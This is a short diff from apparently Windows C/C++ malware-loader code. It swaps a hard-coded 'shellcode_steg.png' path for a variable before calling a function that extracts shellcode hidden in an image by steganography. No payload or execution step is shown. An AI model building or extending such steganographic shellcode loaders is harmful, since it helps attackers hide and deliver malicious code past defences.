@@ -219,7 +219,7 @@ int main() {
 			// 构建图片路径
 			WCHAR imagePath[MAX_PATH];
 			wcscpy_s(imagePath, currentDir);
-			wcscat_s(imagePath, L"\\shellcode_steg.png");
+			wcscat_s(imagePath, stegPath);
 
 			if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
 				DebugPrintA("Failed to extract shellcode from image\n");
